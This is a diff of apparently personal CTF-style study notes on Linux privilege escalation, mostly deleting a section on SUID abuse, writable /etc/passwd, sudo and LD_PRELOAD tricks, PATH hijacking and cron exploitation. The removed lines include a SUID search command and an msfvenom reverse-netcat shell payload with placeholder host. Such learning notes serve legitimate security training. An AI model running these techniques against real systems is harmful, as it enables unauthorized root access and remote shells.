@@ -7591,7 +7591,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt
 Find the flag
 flag2 in \Windows\system32\config</rich_text>
       </node>
-      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707454693">
+      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707539739">
         <rich_text>Understanding privesc
 - going from a lower permission to a higher permission
 - exploitation of vulnerabilities
@@ -7617,52 +7617,7 @@ Enumeration
    → kernel, information, exploitable available for this machine
    → we read/write sensitive files, files that any auth user can read and write to
    → SUID files, interesting items to escalate privileges. SUID is a special type of file permission give to a file
-   → Crontab contents: cron are show here
-
-Abusing SUID/GUID files
-- first step, check files with the SUID/GUID bit set.
-- files to run with permission of owner/group, in this case like root
-- SUID, set of permissions in linux, this is basic in user admin linux, the maximum number pf bits is 7, files with extra bit to owner
-- SUID like: rws-rwx-rwx
-- GUID like: rwx-rws-rwx
-- finding SUID binaries: in manual form: find / -perm -u=s -type f 2&gt;/dev/null
-
-Exploiting writeable /etc/passwd
-- essential information required during login
-- this is a plain text
-- contains a list of system accounts with user ID, group ID, home directory, shell and more
-- total of 7 fields
-
-Escaping vi editor
-- use of sudo -l, to list commands able as a super user, able to run certain commands as a root user without the root password
-- GTFOBins is a curated list of unix binaries that can be exploited
-
-Exploit crontab
-- long-running process that executes commands at specific dates and times
-- see commands: cat /etc/crontab
-- msfvenom -p cmd/unix/reverse_netcat lhost={ip} lport={port} R
-
-Exploting PATH variable
-- an environmental variable in Linux and Unix-like OS which specifies directories that hold executable programs
-- view: echo $PATH
-- basic process like list processes with ps
-- is possible rewrite the PATH variable to a location of our choosing
-
-Sudo - shell escape sequences
-- list programs with sudo permissions: sudo -l
-- use of GTFPbins, using to elevate permissions
-
-Sudo environment vaiables
-- is possible configure certain environment variables
-- to check variables: sudo -l
-- LD_PRELOAD this load a shared object before any others when a program is run and LD_LIBRARY provides a list of directories where shared libraries are searched
-- use of ldd to show libraries before to execute program
-- execute libraries: sudo LD_LIBRARY_PATH=/tmp
-
-Cron jobs, file permissions
-- programs or scripts which users can schedule to run specific times or intervals
-- is located in /etc/crontab
-- </rich_text>
+   → Crontab contents: cron are show here</rich_text>
       </node>
       <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707269298">
         <rich_text>Multiple types of Privileges Escalation
